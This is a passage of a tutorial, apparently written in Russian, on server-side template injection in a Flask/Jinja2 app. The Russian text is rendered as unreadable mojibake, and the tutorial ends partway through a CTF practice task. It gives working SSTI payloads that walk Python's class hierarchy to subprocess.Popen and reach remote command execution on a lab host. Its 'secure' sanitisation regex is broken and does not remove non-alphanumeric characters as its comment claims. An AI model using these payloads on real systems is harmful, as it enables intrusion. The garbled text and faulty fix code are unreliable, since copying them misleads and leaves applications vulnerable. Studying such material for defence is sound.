<p>–ü—Ä–∏ –∏–∑—É—á–µ–Ω–∏–∏ –º–µ—Ö–∞–Ω–∏–∑–º–∞ —à–∞–±–ª–æ–Ω–æ–≤ –≤—Å–µ–≥–¥–∞ –Ω—É–∂–Ω–æ –∏—Å–∫–∞—Ç—å —Å–ª–µ–¥—É—é—â—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é (–Ω–µ–∑–∞–≤–∏—Å–∏–º–æ –æ—Ç —è–∑—ã–∫–∞ –∏–ª–∏ –º–µ—Ö–∞–Ω–∏–∑–º–∞ —à–∞–±–ª–æ–Ω–æ–≤):</p>
<ul>
  <li>–ö–∞–∫ –Ω–∞—á–∞—Ç—å print statement;</li>
  <li>–ö–∞–∫ –∑–∞–∫–æ–Ω—á–∏—Ç—å print statement;</li>
  <li>–ö–∞–∫ –Ω–∞—á–∞—Ç—å block statement;</li>
  <li>–ö–∞–∫ –∑–∞–≤–µ—Ä—à–∏—Ç—å block statement.</li>
</ul>
<p>–í —Å–ª—É—á–∞–µ —Å –Ω–∞—à–∏–º –ø—Ä–∏–º–µ—Ä–æ–º –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ —É–∫–∞–∑–∞–Ω–æ —Å–ª–µ–¥—É—é—â–µ–µ:</p>
<ul>
  <li>{{ ‚Äî –Ω–∞—á–∞–ª–æ print statement;</li><li>}} ‚Äî –∫–æ–Ω–µ—Ü print statement;</li>
  <li>{% ‚Äî –Ω–∞—á–∞–ª–æ block statement;</li><li>%} ‚Äî –∫–æ–Ω–µ—Ü block statement.</li>
</ul>
<p>&nbsp;</p>
<h1><strong>–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è</strong></h1>
<p>–ù–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –º—ã –∑–Ω–∞–µ–º:</p>
<ul>
  <li>–ß—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —É—è–∑–≤–∏–º–æ –¥–ª—è SSTI;</li>
  <li>–¢–æ—á–∫—É –≤–Ω–µ–¥—Ä–µ–Ω–∏—è;</li>
  <li>–ò—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –º–µ—Ö–∞–Ω–∏–∑–º —à–∞–±–ª–æ–Ω–æ–≤;</li>
  <li>–°–∏–Ω—Ç–∞–∫—Å–∏—Å –º–µ—Ö–∞–Ω–∏–∑–º–∞ —à–∞–±–ª–æ–Ω–æ–≤.</li>
</ul>
<h4><strong>–ü–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∞—Ç–∞–∫–∏</strong></h4>
<p>–î–∞–≤–∞–π—Ç–µ —Å–Ω–∞—á–∞–ª–∞ —Å–ø–ª–∞–Ω–∏—Ä—É–µ–º, –∫–∞–∫ –º—ã –±—É–¥–µ–º —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å.</p>
<p>–ü–æ—Å–∫–æ–ª—å–∫—É Jinja2 ‚Äî —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º —à–∞–±–ª–æ–Ω–æ–≤ –Ω–∞ Python, –º—ã —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º —Å–ø–æ—Å–æ–±—ã –∑–∞–ø—É—Å–∫–∞ –∫–æ–º–∞–Ω–¥ –æ–±–æ–ª–æ—á–∫–∏ –≤ Python. –ü–æ–∏—Å–∫ –≤ Google –ø–æ–º–æ–≥–∞–µ—Ç –Ω–∞–π—Ç–∏ —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã –∑–∞–ø—É—Å–∫–∞ –∫–æ–º–∞–Ω–¥ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã, –Ω–∏–∂–µ —è –≤—ã–¥–µ–ª—é –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ –Ω–∏—Ö:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/20c55a373b0bde11bd0bd.png"></figure>
<p style="text-align:center;">–ú–µ—Ç–æ–¥—ã –≤—ã–∑–æ–≤–∞ –∫–æ–º–∞–Ω–¥ –û–° –ø—Ä–∏ –ø–æ–º–æ—â–∏ Python# –ú–µ—Ç–æ–¥ 1 import os os.system("whoami") # –ú–µ—Ç–æ–¥ 2 import os os.popen("whoami").read() # –ú–µ—Ç–æ–¥ 3 import subprocess subprocess.Popen("whoami", shell=True, stdout=-1).communicate()</p>
<h4><strong>–°–æ–∑–¥–∞–Ω–∏–µ POC-–Ω–∞–≥—Ä—É–∑–∫–∏ (—É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ–π)</strong></h4>
<p>–û–±—ä–µ–¥–∏–Ω–∏–≤ –≤—Å–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ –∑–Ω–∞–Ω–∏—è, –º—ã –º–æ–∂–µ–º —Å–æ–∑–¥–∞—Ç—å Proof Of Concept –Ω–∞–≥—Ä—É–∑–∫—É (POC). –°–ª–µ–¥—É—é—â–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–∏–Ω—Ç–∞–∫—Å–∏—Å —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–∞ –∏ –∫–æ–º–∞–Ω–¥—ã –∏ –æ–±–æ–ª–æ—á–∫–∏, –æ–±—ä–µ–¥–∏–Ω—è–µ—Ç –∏—Ö –≤ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä—É—é –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç –º–µ—Ö–∞–Ω–∏–∑–º —à–∞–±–ª–æ–Ω–æ–≤:</p>
<p style="text-align:center;"><code>http://10.10.237.109:5000/profile/{% import os %}{{ os.system("whoami") }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/693bf8916392e1e4f0204.png">
  <figcaption>–†–µ–∑—É–ª—å—Ç–∞—Ç –∑–∞–ø—Ä–æ—Å–∞</figcaption>
</figure>
<p>–û–¥–Ω–∞–∫–æ Jinja2 –ø–æ —Å—É—Ç–∏ —è–≤–ª—è–µ—Ç—Å—è "–ø–æ–¥—ä—è–∑—ã–∫–æ–º" Python, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –∏–Ω—Ç–µ–≥—Ä–∏—Ä—É–µ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä import, –ø–æ—ç—Ç–æ–º—É –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–∞—è –≤—ã—à–µ –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç.</p>
<h4><strong>–°–æ–∑–¥–∞–Ω–∏–µ POC –¥–ª—è Jinja2</strong></h4>
<p>Python –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º –≤—ã–∑—ã–≤–∞—Ç—å —Ç–µ–∫—É—â–∏–π —ç–∫–∑–µ–º–ø–ª—è—Ä –∫–ª–∞—Å—Å–∞ —Å –ø–æ–º–æ—â—å—é <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.__class__">.__class__</a>, –∏ –º—ã –º–æ–∂–µ–º –≤—ã–∑–≤–∞—Ç—å –ø–æ–ª—É—á–∏—Ç—å —ç—Ç–æ—Ç –∞—Ç—Ä–∏–±—É—Ç –¥–ª—è –ø—É—Å—Ç–æ–π —Å—Ç—Ä–æ–∫–∏:</p>
<p style="text-align:center;"><code>http://10.10.237.109:5000/profile/{{ ''.__class__ }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/dd81a77144c785388caef.png">
  <figcaption>–†–µ–∑—É–ª—å—Ç–∞—Ç —Ä–∞–±–æ—Ç—ã –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</figcaption>
</figure>
<p>–ö–ª–∞—Å—Å—ã –≤ Python –∏–º–µ—é—Ç –∞—Ç—Ä–∏–±—É—Ç —Å –∏–º–µ–Ω–µ–º <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__">.__mro__</a>, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º –ø–æ–¥–Ω—è—Ç—å—Å—è –≤–≤–µ—Ä—Ö –ø–æ —É–Ω–∞—Å–ª–µ–¥–æ–≤–∞–Ω–Ω–æ–º—É –¥–µ—Ä–µ–≤—É –æ–±—ä–µ–∫—Ç–æ–≤:</p>
<p style="text-align:center;"><code>http://10.10.237.109:5000/profile/{{ ''.__class__.__mro__ }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/1710f5ab5a7aec72c6f02.png">
  <figcaption>–†–µ–∑—É–ª—å—Ç–∞—Ç —Ä–∞–±–æ—Ç—ã –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</figcaption>
</figure>
<p>–ü–æ—Å–∫–æ–ª—å–∫—É –Ω–∞–º –Ω—É–∂–µ–Ω –∫–æ—Ä–Ω–µ–≤–æ–π –æ–±—ä–µ–∫—Ç, –º—ã —Ö–æ—Ç–∏–º –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫–æ –≤—Ç–æ—Ä–æ–º—É –æ–±—ä–µ–∫—Ç—É –ø–æ–ª—É—á–µ–Ω–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ (–∏–Ω–¥–µ–∫—Å—É 1):</p>
<p style="text-align:center;"><code>http://10.10.237.109:5000/profile/{{ ''.__class__.__mro__[1] }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/89f6af043913b9b793512.png">
  <figcaption>–†–µ–∑—É–ª—å—Ç–∞—Ç —Ä–∞–±–æ—Ç—ã –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</figcaption>
</figure>
<p>–û–±—ä–µ–∫—Ç—ã –≤ Python –∏–º–µ—é—Ç –º–µ—Ç–æ–¥ <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__">.__subclassess__</a>, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º —Å–ø—É—Å–∫–∞—Ç—å—Å—è –ø–æ –¥–µ—Ä–µ–≤—É –æ–±—ä–µ–∫—Ç–æ–≤:</p>
<p style="text-align:center;"><code>http://10.10.237.109:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/8759f222c7b15abba20fd.png">
  <figcaption>–†–µ–∑—É–ª—å—Ç–∞—Ç —Ä–∞–±–æ—Ç—ã –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</figcaption>
</figure>
<p>–¢–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ –Ω–∞–π—Ç–∏ –æ–±—ä–µ–∫—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª–∏—Ç –Ω–∞–º –∑–∞–ø—É—Å–∫–∞—Ç—å –∫–æ–º–∞–Ω–¥—ã –æ–±–æ–ª–æ—á–∫–∏. –ü–æ–∏—Å–∫ –ø—Ä–∏ –ø–æ–º–æ—â–∏ Ctrl-F –¥–∞–µ—Ç –Ω–∞–º —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/47b3fa93fb1bb7ef2d374.png">
  <figcaption>–ü–æ–∏—Å–∫ subprocess</figcaption>
</figure>
<p>–ü–æ—Å–∫–æ–ª—å–∫—É –≤–µ—Å—å —ç—Ç–æ—Ç –≤—ã–≤–æ–¥ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –ø—Ä–æ—Å—Ç–æ —Å–ø–∏—Å–æ–∫ (–º–∞—Å—Å–∏–≤ –≤ Python), –º—ã –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å –∫ –Ω–µ–º—É –¥–æ—Å—Ç—É–ø, –∏—Å–ø–æ–ª—å–∑—É—è –µ–≥–æ –∏–Ω–¥–µ–∫—Å. –ú—ã –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å –Ω—É–∂–Ω—ã–π –∏–Ω–¥–µ–∫—Å –ª–∏–±–æ –º–µ—Ç–æ–¥–æ–º –ø—Ä–æ–± –∏ –æ—à–∏–±–æ–∫, –ª–∏–±–æ –ø–æ—Å—á–∏—Ç–∞–≤ –µ–≥–æ –ø–æ–∑–∏—Ü–∏—é –≤ —Å–ø–∏—Å–∫–µ.</p>
<p>–í —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ –ø–æ–∑–∏—Ü–∏—è –≤ —Å–ø–∏—Å–∫–µ 400 (–∏–Ω–¥–µ–∫—Å 401):</p>
<p style="text-align:center;"><code>http://10.10.237.109:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/7984d2c711b7b94abb6c4.png">
  <figcaption>–†–µ–∑—É–ª—å—Ç–∞—Ç —Ä–∞–±–æ—Ç—ã –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</figcaption>
</figure>
<p>–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω–∞—è –≤—ã—à–µ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—ã–∑—ã–≤–∞–µ—Ç –º–µ—Ç–æ–¥ subprocess.Popen, –∏ —Ç–µ–ø–µ—Ä—å –≤—Å–µ, —á—Ç–æ –Ω–∞–º –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, —ç—Ç–æ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤—ã–∑–≤–∞—Ç—å –µ–≥–æ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ –û–°:</p>
<p style="text-align:center;"><code>http://10.10.237.109:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/fcac31a5902de6050ff6d.png">
  <figcaption>RCE!</figcaption>
</figure>
<p>–¢–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞—Ç—å –∑–∞–ø—Ä–æ—Å–æ–º, –∫–∞–∫ –Ω–∞–º —É–≥–æ–¥–Ω–æ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/ebf28cb2e9888676e5ed3.png">
  <figcaption>–ó–∞–ø—Ä–æ—Å, –ø–µ—Ä–µ–¥–∞—é—â–∏–π –∫–æ–º–∞–Ω–¥—É id, –∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –µ—ë –≤—ã–≤–æ–¥–∞</figcaption>
</figure>
<p>–ü—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∑–∞–Ω–∏–º–∞–µ—Ç –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è, –æ—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ –º—ã –¥–µ–ª–∞–µ–º —ç—Ç–æ –≤ –ø–µ—Ä–≤—ã–π —Ä–∞–∑, –æ–¥–Ω–∞–∫–æ –≤–∞–∂–Ω–æ –ø–æ–Ω—è—Ç—å, –ø–æ—á–µ–º—É —ç—Ç–∞ –Ω–∞–≥—Ä—É–∑–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç.</p>
<p>–î–ª—è —Å–ø—Ä–∞–≤–∫–∏: –Ω–∞ GitHub –µ—Å—Ç—å –≤–µ–ª–∏–∫–æ–ª–µ–ø–Ω—ã–π <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π</a> –≤ –≤–∏–¥–µ —à–ø–∞—Ä–≥–∞–ª–∫–∏ –ø–æ –ø–æ–ª–µ–∑–Ω—ã–º –Ω–∞–≥—Ä—É–∑–∫–∞–º –¥–ª—è –≤—Å–µ—Ö –≤–µ–±-—É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, –≤–∫–ª—é—á–∞—è <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">SSTI</a>. –¢–∞–∫–∂–µ –Ω–µ –º–æ–≥—É –Ω–µ —É–ø–æ–º—è–Ω—É—Ç—å –ø–æ—Ä—Ç–∞–ª HackTricks, –∫–æ—Ç–æ—Ä—ã–π —Ç–∞–∫–∂–µ –¥–æ–≤–æ–ª—å–Ω–æ —Ö–æ—Ä–æ—à–æ –æ–ø–∏—Å—ã–≤–∞–µ—Ç <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python">—ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ–º—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å</a>.</p>
<p>&nbsp;</p>
<h1><strong>–ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ</strong></h1>
<p>–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –º—ã —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –¥–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏–ª–æ –ø—Ä–∏ –≤–Ω–µ–¥—Ä–µ–Ω–∏–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</p>
<p>–ö–æ–¥ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–π –º—ã —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞–ª–∏, –±—ã–ª –ø—Ä–∏–≤–µ–¥–µ–Ω –≤ –Ω–∞—á–∞–ª–µ —Å—Ç–∞—Ç—å–∏:</p>
<p style="text-align:center;"><code>from flask import Flask, render_template_string app = Flask(__name__) @app.route("/profile/&lt;user&gt;") def profile_page(user): &nbsp;&nbsp;template = f"&lt;h1&gt;Welcome to the profile of {user}!&lt;/h1&gt;" &nbsp;&nbsp;return render_template_string(template) app.run()</code></p>
<p>–ü–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤–Ω—É—Ç—Ä–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –ø—Ä–∏ —Ä–∞–∑–Ω–æ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º –≤–≤–æ–¥–µ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/a5987d80d7a49bc1cf02e.png">
  <figcaption>–°—Ç—Ä–æ–∫–∞ template –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤–≤–æ–¥–∞</figcaption>
</figure>
<p style="text-align:center;"><code># –ò—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ template = f"&lt;h1&gt;Welcome to the profile of {user}!&lt;/h1&gt;" # –ö–æ–¥ –ø–æ—Å–ª–µ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è cherepawwka template = f"&lt;h1&gt;Welcome to the profile of cherepawwka!&lt;/h1&gt;" # –ö–æ–¥ –ø–æ—Å–ª–µ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è {{ 7 * 7 }} template = f"&lt;h2&gt;Welcome to the profile of {{ 7 * 7 }}!&lt;/h1&gt;"</code></p>
<p>–†–∞–Ω–µ–µ –º—ã —É–∑–Ω–∞–ª–∏, —á—Ç–æ Jinja2 –±—É–¥–µ—Ç –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –º–µ–∂–¥—É –Ω–∞–±–æ—Ä–æ–º —Å–∏–º–≤–æ–ª–æ–≤ {{ –∏ }}, –ø–æ—ç—Ç–æ–º—É —ç–∫—Å–ø–ª–æ–π—Ç —Å—Ä–∞–±–æ—Ç–∞–ª.</p>
<p>&nbsp;</p>
<h3><strong>–£—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</strong></h3>
<p>–ß—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, —á—Ç–æ–±—ã –∏–∑–±–∞–≤–∏—Ç—å—Å—è –æ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏?</p>
<h4><strong>–ë–µ–∑–æ–ø–∞—Å–Ω—ã–µ –º–µ—Ç–æ–¥—ã</strong></h4>
<p>–ë–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–æ–≤ –∏–º–µ—é—Ç —Ñ—É–Ω–∫—Ü–∏—é, –ø–æ–∑–≤–æ–ª—è—é—â—É—é –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –≤–≤–æ–¥ –≤ –≤–∏–¥–µ –¥–∞–Ω–Ω—ã—Ö, –∞ –Ω–µ –æ–±—ä–µ–¥–∏–Ω—è—Ç—å –≤–≤–æ–¥ –≤ —à–∞–±–ª–æ–Ω.</p>
<p>–í Jinja2 —ç—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é –≤—Ç–æ—Ä–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/fac10fb27ccca302f9aab.png">
  <figcaption>–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–∞—á–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞ –≤ —à–∞–±–ª–æ–Ω</figcaption>
</figure>
<p style="text-align:center;"><code># Insecure: Concatenating input template = f"&lt;h1&gt;Welcome to the profile of {user}!&lt;/h1&gt;" return render_template_string(template) # Secure: Passing input as data template = "&lt;h1&gt;Welcome to the profile of {{ user }}!&lt;/h1&gt;" return render_template_string(template, user=user)</code></p>
<h4><strong>–°–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö</strong></h4>
<p>–í–≤–æ–¥—É –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ–ª—å–∑—è –¥–æ–≤–µ—Ä—è—Ç—å. –ö–∞–∂–¥–æ–µ –º–µ—Å—Ç–æ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏, –≥–¥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —Ä–∞–∑—Ä–µ—à–µ–Ω–æ –≤–≤–æ–¥–∏—Ç—å –¥–∞–Ω–Ω—ã–µ, –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å "–¥–µ–∑–∏–Ω—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–æ".</p>
<p>–≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, —Å–ø–ª–∞–Ω–∏—Ä–æ–≤–∞–≤, –∫–∞–∫–æ–π –Ω–∞–±–æ—Ä —Å–∏–º–≤–æ–ª–æ–≤ –º—ã —Ö–æ—Ç–∏–º —Ä–∞–∑—Ä–µ—à–∏—Ç—å, –∏ –¥–æ–±–∞–≤–∏–≤ –µ–≥–æ –≤ –±–µ–ª—ã–π —Å–ø–∏—Å–æ–∫.</p>
<p>–ù–∞–ø—Ä–∏–º–µ—Ä, –í Python —ç—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Ç–∞–∫:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/9edc7476985d199a00150.png">
  <figcaption>–°–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –ø–æ–º–æ—â–∏ regeximport re&nbsp;</figcaption>
</figure>
<p style="text-align:center;"><code># Remove everything that isn't alphanumeric user = re.sub("^[A-Za-z0-9]", "", user) template = "&lt;h1&gt;Welcome to the profile of {{ user }}!&lt;/h1&gt;" return render_template_string(template, user=user)</code></p>
<p>–°–∞–º–æ–µ –≥–ª–∞–≤–Ω–æ–µ –Ω–µ –∑–∞–±—ã–≤–∞—Ç—å —á–∏—Ç–∞—Ç—å –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—é –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–≥–æ –º–µ—Ö–∞–Ω–∏–∑–º–∞ —à–∞–±–ª–æ–Ω–æ–≤ :)</p>
<p>&nbsp;</p>
<h1><strong>–ü—Ä–∞–∫—Ç–∏–∫–∞</strong></h1>
<p>–î–ª—è –∑–∞–∫—Ä–µ–ø–ª–µ–Ω–∏—è –∏–∑—É—á–µ–Ω–Ω–æ–≥–æ –º–∞—Ç–µ—Ä–∏–∞–ª–∞ —Ä–µ—à–∏–º –ø—Ä–æ—Å—Ç–æ–π —Ç–∞—Å–∫ —Å –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã codeBy Games –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º "–ü–æ–∑–¥—Ä–∞–≤–∏—Ç–µ–ª—å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ":</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/87f3f34d475f53c26a94b.png">
  <figcaption>–û–ø–∏—Å–∞–Ω–∏–µ –∑–∞–¥–∞–Ω–∏—è</figcaption>
</figure>
<p>–ö –∑–∞–¥–∞–Ω–∏—é –ø—Ä–∏–ª–æ–∂–µ–Ω–∞ –ø–æ–¥—Å–∫–∞–∑–∫–∞, –≥–¥–µ –Ω–∞–º —Å–æ–æ–±—â–∞—é—Ç, —á—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º —à–∞–±–ª–æ–Ω—ã Flask. –ú—ã —É–∂–µ –∑–Ω–∞–µ–º, —á—Ç–æ —Ç–∞—Å–∫ –±—É–¥–µ—Ç —Å–≤—è–∑–∞–Ω —Å SSTI, —Ç–∞–∫ —á—Ç–æ –ø—Ä–∏—Å—Ç—É–ø–∏–º –∫ —Ä–µ—à–µ–Ω–∏—é.</p>
<p>–¢–∞–∫ –∫–∞–∫ –º—ã –∑–Ω–∞–µ–º, —á—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞–ø–∏—Å–∞–Ω–æ –Ω–∞ Flask, –≤–µ—Ä–æ—è—Ç–Ω–µ–µ –≤—Å–µ–≥–æ –≤ –∫–∞—á–µ—Å—Ç–≤–µ —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è Jinja2. –û–¥–Ω–∞–∫–æ –¥–∞–≤–∞–π—Ç–µ –ø—Ä–æ–π–¥–µ–º –ø–æ –¥–µ—Ä–µ–≤—É —Ä–µ—à–µ–Ω–∏–π:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/558f782af10111bc6c94c.png">
  <figcaption>–ò–¥—ë–º –ø–æ –∫—Ä–∞—Å–Ω–æ–π —Å—Ç—Ä–µ–ª–∫–µ</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/c8001317255b282e312e7.png">
  <figcaption>–ò–¥—ë–º –ø–æ –∑–µ–ª—ë–Ω–æ–π —Å—Ç—Ä–µ–ª–∫–µ</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/af2d95b6ff9a8a739edc6.png">
  <figcaption>–†–∞—Å–ø–æ–∑–Ω–∞—ë–º Jinja2</figcaption>
</figure>
<p>–®–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω!</p>
